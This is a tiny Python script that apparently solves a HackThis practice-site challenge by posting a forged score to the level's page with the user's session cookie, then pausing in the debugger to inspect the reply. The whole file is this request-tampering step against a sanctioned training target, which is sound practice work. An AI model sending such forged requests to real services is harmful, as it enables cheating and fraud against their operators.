import pdb
import requests

cookies = {"PHPSESSID": ""}  # Fill this in.
response = requests.post("https://www.hackthis.co.uk/levels/b3.php?submit", data={"score": 194175}, cookies=cookies)
pdb.set_trace()  # Manually look at the response
